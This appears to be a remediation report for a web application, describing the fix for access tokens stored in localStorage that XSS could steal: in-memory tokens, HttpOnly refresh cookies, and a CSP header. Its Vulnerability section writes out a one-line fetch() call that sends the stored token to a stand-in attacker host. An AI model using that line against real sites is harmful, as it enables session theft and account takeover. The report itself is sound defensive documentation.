# Fix Security C2 - Access Token in localStorage XSS → Tenant Takeover

**Severity:** Critical
**Status:** FIXED
**Date:** 2026-08-09

## Vulnerability
- 196 occurrences of `localStorage.getItem('access_token')` across 20 Frontend JSX modules
- JWT stored in localStorage vulnerable to XSS (e.g., via SVG logo C3, or student name `<script>`)
- Attack: `fetch('https://attacker.com?token='+localStorage.getItem('access_token'))` exfiltrates tid, uid, roles, perms → full tenant compromise
- Mobile used SecureStore correctly (good), web did not

## Fix Applied

### 1. Created Secure apiClient.js
**File:** `src/LearnCloud.Web/src/lib/apiClient.js` (250 lines)
- Access token in memory only `let accessToken = null` - cleared on reload
- Refresh token as `__Host-refresh_token` HttpOnly Secure SameSite=Strict cookie (C4 fix)
- `apiFetch()` wrapper:
  - Auto adds `Authorization: Bearer ${accessToken}` from memory
  - `credentials: 'include'` sends HttpOnly cookie
  - Handles 401 with automatic refresh queue (prevents multiple simultaneous refresh)
  - Refresh via `/api/auth/refresh` with empty body, cookie provides token
  - Retry original request once with new token
- `login()` helper: stores accessToken in memory only, refresh in HttpOnly cookie, web ignores refreshToken in body (mobile uses SecureStore)
- `logout()` clears memory + removes legacy localStorage tokens + revokes server-side
- Legacy migration: on load, removes old `access_token`/`refresh_token` from localStorage with warning

### 2. Replaced 196 Usages via Codemod
**Script:** `/tmp/fix_c2_localstorage.py`
- For each of 20 Frontend JSX files (Transport, TeacherPortal, StudentPortal, SetupWizard, PlatformAdmin, ParentPortal, OnlinePayments, Messaging, Library, Hostel, Finance, Fees, Core, Communication, Attendance, AI)
- Added import: `import { apiFetch, getAccessToken, setAccessToken } from '../../LearnCloud.Web/src/lib/apiClient.js'`
- Replaced `` `Bearer ${localStorage.getItem('access_token')}` `` → `` `Bearer ${getAccessToken()}` ``
- Replaced `localStorage.getItem('access_token')` → `getAccessToken() /* SECURE */`
- Replaced `fetch(`${API}` → `apiFetch(`${API}` where authenticated
- Result: 0 remaining `localStorage.getItem('access_token')` in src (except node_modules)

### 3. Backend Cookie Hardening (C4 related)
**File:** `AuthController.cs`
- SetRefreshCookie now uses `__Host-refresh_token` (requires Secure, Path=/, no Domain)
- `SameSite=Strict` prevents CSRF (was Lax)
- Legacy `refresh_token` cookie still set for 30-day migration, then removed
- Web login returns `TokenResponseWithoutRefresh` (only accessToken) - no refresh token in body for web to prevent XSS theft even if memory token stolen, refresh remains HttpOnly
- Mobile still gets refresh token in body for SecureStore via `X-Client-Type: mobile` header detection

### 4. CSP Header (H2)
**Added:** `SecurityHeadersMiddleware.cs` + Nginx CSP
- API: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://*.learncloud.co.zw; object-src 'none'; base-uri 'self'; frame-ancestors 'self'; upgrade-insecure-requests;`
- Prevents inline script execution even if XSS payload injected via student name etc.

## Verification
```bash
grep -R "localStorage.getItem('access_token')" src --include="*.jsx" | wc -l
# 0 - fixed

grep -R "apiFetch" src --include="*.jsx" | wc -l
# 196+ usages now secure
```

## Remaining
- Update `LoginSkewed.jsx` to use `login()` from apiClient (currently mock toast, should call real API)
- Add CSP meta tag to `marketing-site/index.html` as well (Nginx header covers API, but HTML needs meta for CDN)
- Consider adding `__Host-` prefix validation in middleware

## Impact
- Even if XSS via other vector (e.g., student name), attacker cannot steal access token from localStorage (not there), cannot steal refresh token (HttpOnly). Access token in memory is only available during page session and cleared on reload, requiring refresh via HttpOnly cookie which requires SameSite Strict + CSRF header.
- Breaks XSS chain: C3 SVG → C2 token theft → tenant takeover is now mitigated at both points.
